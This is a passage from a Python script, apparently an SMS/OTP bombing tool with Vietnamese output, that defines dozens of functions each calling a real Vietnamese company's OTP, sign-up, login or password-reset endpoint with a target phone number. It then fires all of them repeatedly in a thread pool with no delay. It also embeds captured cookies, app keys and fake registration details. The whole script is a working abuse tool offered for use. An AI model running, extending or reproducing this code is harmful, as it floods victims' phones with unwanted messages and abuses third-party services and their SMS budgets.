        '_ga_GECRBQV6JK': 'GS1.1.1737281357.1.0.1737281357.60.0.0',
        '_gat_UA-239546923-1': '1',
        '_gat_gtag_UA_66880228_1': '1',
        '_gid': 'GA1.2.2026095079.1737281357',
        'lang': 'vi',
    }

    headers = {
        'Host': 'accounts.sapo.vn',
        # 'Cookie': '_ce.s=v~49080a70832696e187ca7fecd56e47732d086b79~lcw~1737281377270~vir~new~lva~1737281358226~vpv~0~v11.fhb~1737281358870~v11.lhb~1737281358870~v11.cs~200798~v11.s~7235a980-d64d-11ef-b9eb-6fd44cdb52b3~v11.sla~1737281377273~lcw~1737281377274; _gcl_au=1.1.469866645.1737281357.833280956.1737281366.1737281366; _ga_8Z6MB85ZM2=GS1.1.1737281358.1.0.1737281362.56.0.0; _ga_P9DPF3E00F=GS1.1.1737281357.1.0.1737281361.56.0.1419720187; _fbp=fb.1.1737281358518.413443319714398426; _ga=GA1.1.1455940863.1737281357; _ga_HXMGB9WRVX=GS1.1.1737281359.1.0.1737281359.60.0.0; _ce.clock_data=78%2C171.224.177.243%2C2%2Ced14c804f644b5b0aaa13f3f8ddb4a1f%2CMobile%20Safari%2CVN; _ga_EBZKH8C7MK=GS1.2.1737281358.1.0.1737281358.0.0.0; _ga_Y9YZPDEGP0=GS1.1.1737281358.1.0.1737281358.60.0.0; _ga_YNVPPJ8MZP=GS1.1.1737281357.1.0.1737281358.59.0.0; _pk_id.564990941.8ae7=0.1737281358.1.1737281358.1737281358.; _pk_ses.564990941.8ae7=*; cebs=1; cebsp_=1; _ga_8956TVT2M3=GS1.1.1737281357.1.0.1737281357.60.0.0; _ga_CDD1S5P7D4=GS1.1.1737281357.1.0.1737281357.60.0.0; _ga_GECRBQV6JK=GS1.1.1737281357.1.0.1737281357.60.0.0; _gat_UA-239546923-1=1; _gat_gtag_UA_66880228_1=1; _gid=GA1.2.2026095079.1737281357; lang=vi',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'accept': '*/*',
        'sec-fetch-site': 'same-site',
        'accept-language': 'vi-VN,vi;q=0.9',
        'sec-fetch-mode': 'cors',
        'origin': 'https://app.sapo.vn',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/537.36',
        'referer': 'https://app.sapo.vn/',
        'sec-fetch-dest': 'empty',
    }

    data = {
        'CountryCode': '84',
        'InfoSource': '',
        'FullName': 'duy dub',
        'PhoneNumber': sdt,
        'StoreName': 'huy bb6',
        'PackageTitle': 'mobile_v3',
        'City': 'Hồ Chí Minh',
        'Preferred': '',
        'SaleName': '',
        'Reference': '',
        'Source': 'iphone',
        'Referral': '',
        'Campaign': '',
        'LandingPage': '',
        'StartTime': '',
        'EndTime': '',
        'PageView': '',
        'AffId': '',
        'AffTrackingId': '',
        'Partner': '',
        'Type': '1',
        'PreferredService': '',
        'SalesTeam': '',
        'SocialSource': '',
        'FacebookName': '',
        'FacebookAvatar': '',
        'FacebookId': '',
        'FacebookEmail': '',
        'GoogleId': '',
        'GoogleEmail': '',
        'GoogleName': '',
        'Country': '',
    }

    try:
        response = requests.post('https://accounts.sapo.vn/register', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()
        print("SAPO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SAPO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def truedoc(): #ap
    headers = {
        'Host': 'mapi.aihealth.vn',
        'accept': 'application/json',
        'content-type': 'application/json; charset=utf-8',
        'x-auth-id': '9B1B13952BD9FF446AB569BBB49B3',
        'authorization': 'Bearer ',
        'postman-token': 'f3dc96f9-6287-46cb-9b93-7d69dfeca783,298d8d62-ed78-4b27-b614-182d047e15fa',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'AI_HEALTH/14 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN',
    }

    params = {
        'Phone': sdt,
        'CountryCode': '84',
        'DeviceId': '5308E878-5785-4579-B17D-736E1E008E47',
        'UuidByKeychain': '5308E878-5785-4579-B17D-736E1E008E47',
        'GrantType': 'register_key',
    }

    try:
        response = requests.get('https://mapi.aihealth.vn/api/mobile/v1/sso/register/key', params=params, headers=headers)
        response.raise_for_status()
        print("TRUEDOC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TRUEDOC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def upos():
    cookies = {
        'PHPSESSID': 'r0g4am8fc9mca3oog8qoqr210c',
        'csrf_cookie_name': '7de896c744b3243507adc8464c4639b0',
        'ci_site_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%226109b7920c5c1919fa56eb79e4931d6f%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22192.168.20.254%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%20OPR%2F116.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1739087391%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D96dd2d0798aeec97ac9687f941e36d6d16d971a6',
        'client_token': '0ed4d83674c1c142d8677203d89926ad173908741521897055',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Cookie': 'PHPSESSID=r0g4am8fc9mca3oog8qoqr210c; csrf_cookie_name=7de896c744b3243507adc8464c4639b0; ci_site_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%226109b7920c5c1919fa56eb79e4931d6f%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22192.168.20.254%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%20OPR%2F116.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1739087391%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D96dd2d0798aeec97ac9687f941e36d6d16d971a6; client_token=0ed4d83674c1c142d8677203d89926ad173908741521897055',
        'Referer': 'https://upos.vn/vn/dang-ky.html?package=pos',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Opera";v="116", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        response = requests.get(f'https://upos.vn/vn/home/send_brandname_otp/{sdt}', cookies=cookies, headers=headers)
        response.raise_for_status()
        print("UPOS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("UPOS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ghephang(): #ap
    cookies = {
        'session_id_gh': '"c6/127.0.0.1-9db86a4f-16d6-4114-ac03-4c1162339dc6"',
    }

    headers = {
        'Host': 'quanly.ghephang.com',
        'Accept': 'application/json, text/plain, */*',
        # 'Cookie': 'session_id_gh="c6/127.0.0.1-9db86a4f-16d6-4114-ac03-4c1162339dc6"',
        'User-Agent': 'GhepHangKhachHang/22 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }

    params = {
        'phone': sdt,
        'id_device': 'CFAA3646-4D74-43A4-ADAC-4240BBAF87BF',
        'zalo': '0',
    }

    try:
        response = requests.get(
            'https://quanly.ghephang.com/gh/api_driver/send_otp_v2.json',
            params=params,
            cookies=cookies,
            headers=headers,
        )
        response.raise_for_status()
        print("GHEPHANG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHEPHANG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ghephangzl(): #^^^^ ap
    cookies = {
        'session_id_gh': '"c6/127.0.0.1-9db86a4f-16d6-4114-ac03-4c1162339dc6"',
    }

    headers = {
        'Host': 'quanly.ghephang.com',
        'Accept': 'application/json, text/plain, */*',
        # 'Cookie': 'session_id_gh="c6/127.0.0.1-9db86a4f-16d6-4114-ac03-4c1162339dc6"',
        'User-Agent': 'GhepHangKhachHang/22 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }

    params = {
        'phone': sdt,
        'id_device': 'CFAA3646-4D74-43A4-ADAC-4240BBAF87BF',
        'zalo': '1',
    }

    try:
        response = requests.get(
            'https://quanly.ghephang.com/gh/api_driver/send_otp_v2.json',
            params=params,
            cookies=cookies,
            headers=headers,
        )
        response.raise_for_status()
        print("GHEPHANG ZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHEPHANG ZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ahamove(): #ap \giao hang go!\
    random_email = generate_random_email()
    headers = {
        'Host': 'api.ahamove.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'accepts-version': '2',
        'user-agent': 'OnWheel_Supplier OnWheel/1.7 (com.ahamove.GoOi; build:5; iOS 17.4.1) Alamofire/5.9.1',
        'accept-language': 'vi-VN;q=1.0',
    }

    data = f'{{"name":"tran duc","lat":9.996776283119221,"email":"{random_email}","mobile":"{sdt}","country_code":"VN","lng":29.648256066635,"referral_code":""}}'

    response = requests.post('https://api.ahamove.com/api/v3/public/supplier/register', headers=headers, data=data)
    headers1 = {
        'Host': 'api.ahamove.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'accepts-version': '2',
        'user-agent': 'OnWheel_Supplier OnWheel/1.7 (com.ahamove.GoOi; build:5; iOS 17.4.1) Alamofire/5.9.1',
        'accept-language': 'vi-VN;q=1.0',
    }

    json_data = {
        'mobile': f'{sdt[0:3]} {sdt[3:7]} {sdt[7:10]}',
        'resend': False,
    }

    try:
        response = requests.post('https://api.ahamove.com/api/v3/public/supplier/login', headers=headers1, json=json_data)
        response.raise_for_status()
        print("AHAMOVE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("AHAMOVE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hvb(): #ap \mua ngay\
    random_email = generate_random_email()
    cookies = {
        'ApplicationGatewayAffinity': 'f5a3c078cda30b7a72eb318a56bc22c3a7bd8720bca4f58a5a4d6f638aa015f2',
        'ApplicationGatewayAffinityCORS': 'f5a3c078cda30b7a72eb318a56bc22c3a7bd8720bca4f58a5a4d6f638aa015f2',
    }

    headers = {
        'Host': 'api-app.muangay-vn.com',
        # 'Cookie': 'ApplicationGatewayAffinity=f5a3c078cda30b7a72eb318a56bc22c3a7bd8720bca4f58a5a4d6f638aa015f2; ApplicationGatewayAffinityCORS=f5a3c078cda30b7a72eb318a56bc22c3a7bd8720bca4f58a5a4d6f638aa015f2',
        'locale': 'vi',
        'accept': 'multipart/form-data',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'UMenu/433 CFNetwork/1494.0.7 Darwin/23.4.0',
        'version': '3',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    data = {
        'mobilePhone': sdt,
        'userName': 'tran duc',
        'name': random_email,
        'roleId': '2',
    }

    try:
        response = requests.post('https://api-app.muangay-vn.com/api/outlet/register/info', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()
        print("HVB | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HVB | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hoatoc247(): #ap
    headers = {
        'Host': 'api.hoatoc247.com:8080',
        'hash': '6a34ed52dc813de78dc95dd5f7a051e1',
        'Accept': 'application/json, text/plain, */*',
        'version': '1.2.45',
        'app-version': '1.2.45',
        'time': '1739092657',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Content-Type': 'application/json',
        'User-Agent': 'HoaToc247/1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'lang': 'vi',
    }

    json_data = {
        'customer': {
            'rePassword': '123123aAa@',
            'password': '123123aAa@',
            'areaId': '172',
            'rePhone': '0357156329',
            'phone': sdt,
            'name': 'Nguyen Huy Dol',
            'area': {
                'id': 172,
                'createdAt': 1724208478,
                'updatedAt': 1737688142,
                'deletedAt': None,
                'isDeleted': False,
                'name': 'Nga SÆ¡n - Thanh HÃ³a',
                'position': 2,
                'balance': 68282655,
                'codLimit': 1000000,
                'isMaintain': False,
                'isVisible': True,
                'isBlockBalance': False,
            },
            'refPhone': '',
        },
        'otp': '',
        'deviceId': 'E9F41C72-D646-4489-BD13-BC789331B0F4',
        'areaId': 172,
    }

    response = requests.post('https://api.hoatoc247.com:8080/v1/auth/signup', headers=headers, json=json_data)
    headers = {
        'Host': 'api.hoatoc247.com:8080',
        'hash': 'a47cbf5838ff5e902d56068b616ae09c',
        'Accept': 'application/json, text/plain, */*',
        'version': '1.2.45',
        'app-version': '1.2.45',
        'time': '1739092703',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Content-Type': 'application/json',
        'User-Agent': 'HoaToc247/1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'lang': 'vi',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://api.hoatoc247.com:8080/v1/auth/forgot', headers=headers, json=json_data)
        response.raise_for_status()
        print("HOATOC247 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOATOC247 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def gotp(): #ap \mico\
    cookies = {
        'aliyungf_tc': '661583488e481df3abede768fc68b68663745b474d9965c188fbe8a050cef5f3',
    }

    headers = {
        'Host': 'api.micoworld.net:443',
        # 'Cookie': 'aliyungf_tc=661583488e481df3abede768fc68b68663745b474d9965c188fbe8a050cef5f3',
        'language': 'vi',
        'did': '6b630b40c619d590ee4e0b3a301c9ac69e4d1b55',
        'user-agent': 'Mico/8.28.0 (iPhone; iOS 17.4.1; Scale/2.00)',
        'encryption': 'c5rvZI0JZ9dT5MYlVk/QisRVdNkcywbi0I6jRUm/jVAaVXCWchDBgZliVJv2nhvJKXN5kdvdopWZL1k606gFVtxZonrYyYFO7Q8XOnwWf7ZVfUCh0RBw3pzE//MTHZn5',
        'channel': 'appstore',
        'pkg': 'com.meets.Meets',
        'locale': 'vi_VN',
        'version': 'vc-210754-vn-8.28.0.36332',
        'os': 'ios-17.4.1-iPhone XR',
        'att': '2',
        'sign': 'channelType=0func=0nonce=1739093368991901number=0357156329pkg=com.meets.Meetsprefix=84',
        'uid': '0',
        'appsflyer-id': '1739088102411-9175093',
        'accept-language': 'vi-VN;q=1',
        'timezone': '7',
        'md5': 'cdfbb4dacc3c8f3e5b8a69a7a386186b',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded',
        'idfa': 'unknown',
    }

    data = {
        'channelType': '0',
        'func': '0',
        'nonce': '1739093368991901',
        'number': sdt,
        'pkg': 'com.meets.Meets',
        'prefix': '84',
    }

    try:
        response = requests.post(
            'https://api.micoworld.net:443/api/accountkit/phone/verification_code/send',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()
        print("MICO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MICO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def zodi(): #ap
    headers = {
        'Host': 'pro.zodicorp.vn',
        'X-Parse-Client-Version': 'swift4.14.2',
        'Accept': '*/*',
        'X-Parse-Application-Id': 'f188e6ad0bcb7e391729b71feb1bd1fc966dffbf',
        'X-Parse-Client-Key': 'e5c06f986b709c9822537a8d7cfd8ff92f32052d',
        'X-Parse-Installation-Id': '8b112872-470e-4d58-9d9c-eb71a8b9caeb',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Content-Type': 'application/json',
        'User-Agent': 'Zodi/250207.1940 CFNetwork/1494.0.7 Darwin/23.4.0',
        'X-Parse-Request-Id': '32f231fc-2729-48ba-bcc9-b52a34908267',
    }

    params = {
        'sig': 'df7f485b3f449910cb25b304c32a88f7',
    }

    json_data = {
        'checkExists': False,
        'countryCode': '84',
        'locale': 'vi',
        'method': 'sms',
        'phoneNumber': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://pro.zodicorp.vn/api/functions/SendCode', params=params, headers=headers, json=json_data)
        response.raise_for_status()
        print("ZODI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ZODI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vamo():
    cookies = {
        'idux_session_id': '7d75abd4-1d3f-4e76-82a6-a41bce326521',
    }

    headers = {
        'Host': 'api-app.vamo.vn',
        # 'Cookie': 'idux_session_id=7d75abd4-1d3f-4e76-82a6-a41bce326521',
        'wss-clientid': 'ECC10EB3-BF97-40E1-A9B1-20E18C0C9E77',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Vamo/4 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://api-app.vamo.vn/api/client/phone-verify/resend', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()
        print("VAMO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VAMO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def kfc():
    headers = {
        'Host': 'api.kfcvietnam.com.vn',
        'content-type': 'application/json',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'user-agent': 'KFC Vietnam/1.13.3.0001 CFNetwork/1494.0.7 Darwin/23.4.0',
        'x-mck-key': 'bdc6ad8b-b3f4-4115-9c47-df80de5ef8c9',
    }

    json_data = {
        'sendType': 1,
        'phoneNumber': sdt,
        'token': '',
    }

    try:
        response = requests.post('https://api.kfcvietnam.com.vn/api/v1/authentication/user/login/resendotp', headers=headers, json=json_data)
        response.raise_for_status()
        print("KFC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KFC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def beaxy():
    headers = {
        'Host': 'api-dev.beaxy.com',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'Content-Type': 'application/json',
        'Origin': 'https://dev.beaxy.com',
        'Referer': 'https://dev.beaxy.com/',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
        'code': '+84',
    }

    try:
        response = requests.post('https://api-dev.beaxy.com/api/v2/auth/login/get/otp', headers=headers, json=json_data)
        response.raise_for_status()
        print("BEAXY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEAXY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def loship():
    headers = {
        'Host': 'mocha-api.loship.vn',
        'Content-Type': 'application/json',
        'Origin': 'https://loship.vn',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'Referer': 'https://loship.vn/',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://mocha-api.loship.vn/v2/auth/register', headers=headers, json=json_data)
        response.raise_for_status()
        print("LOSHIP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LOSHIP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vayvnd():
    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Opera";v="115", "Chromium";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'utm': '',
        'platform': 'web',
        'captcha': '',
    }

    try:
        response = requests.post('https://api.vayvnd.vn/v1/users/password-reset', headers=headers, json=json_data)
        response.raise_for_status()
        print("VAYVND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VAYVND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pizzahut():
    headers = {
        'authority': 'api.pizzahut.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'application-password': 'fajLRd7ULoo=',
        'application-username': 'marketing',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://pizzahut.vn',
        'referer': 'https://pizzahut.vn/',
        'sec-ch-ua': '"Opera";v="115", "Chromium";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://api.pizzahut.vn/api/customer/registerCustomerCheckVnMobileExist', headers=headers, json=json_data)
        response.raise_for_status()
        print("PIZZAHUT | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PIZZAHUT | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def cake():
    headers = {
        'authority': 'apiv2.cake.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.cake.vn',
        'referer': 'https://www.cake.vn/',
        'sec-ch-ua': '"Opera";v="115", "Chromium";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    }

    json_data = {
        'mobile': sdt,
        'countryCode': '84',
        'captchaCode': '',
        'captchaId': '',
    }

    try:
        response = requests.post('https://apiv2.cake.vn/api/Customer/OTP', headers=headers, json=json_data)
        response.raise_for_status()
        print("CAKE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CAKE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinid():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://id.vinid.net',
        'Referer': 'https://id.vinid.net/auth/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'sec-ch-ua': '"Opera";v="115", "Chromium";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phoneNumber': sdt,
        'language': 'vi',
    }

    try:
        response = requests.post('https://api-account.vinid.net/api/v1/user/otp', headers=headers, json=json_data)
        response.raise_for_status()
        print("VINID | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINID | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def appota():
    headers = {
        'authority': 'appota.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://appota.com',
        'referer': 'https://appota.com/register',
        'sec-ch-ua': '"Opera";v="115", "Chromium";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://appota.com/api/v1/sessions/send_opt_code', headers=headers, json=json_data)
        response.raise_for_status()
        print("APPOTA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("APPOTA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

functions = [
    tv360, vieon, myviettel, fptshop, befood, foodhubzl,
    vttelecom, vinwonders, hasaki, fahasa, medigozl,
    medigosms, mocha, liena, viettelpost, ghtk, vuihoc,
    vnsc, goldenspoonssms, bibomart,
    zl188, goldenspoonszl, goldenspoonszlresend,
    goldenspoonssmsresend, hoangphuc, trungsoncarezl,
    trungsoncaresms, kkfashion, thecoffeehouse, homeid,
    hasaki, cathayliferesend,
    vinschool, highlands, meeyland, ghephangzl,
    vinfastescooter, taskal, star_t, nhadatvui,
    mocha35, thuongdo, unica, monkeyjunior,
    babilala, edupia, vkids, mytv, ahamove,
    cathaylife, prepedu, bigm, atmnha, hvb, zodi,
    dynaminds, gicula, dalatbds, mocha2, jupviec, guvi,
    aio, fpt, unicar, lozido, pingpush, ting,
    kanow, butlsms, butlzl, ilokafood, vieclam24h,
    sobanhangzl, sobanhang, sfin, sapo,
    truedoc, upos, ghephang, hoatoc247, gotp,
    vamo, kfc, beaxy, loship, vayvnd, pizzahut, cake, vinid, appota
]

with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in range(count):
        for func in functions:
            executor.submit(func)
            time.sleep(0)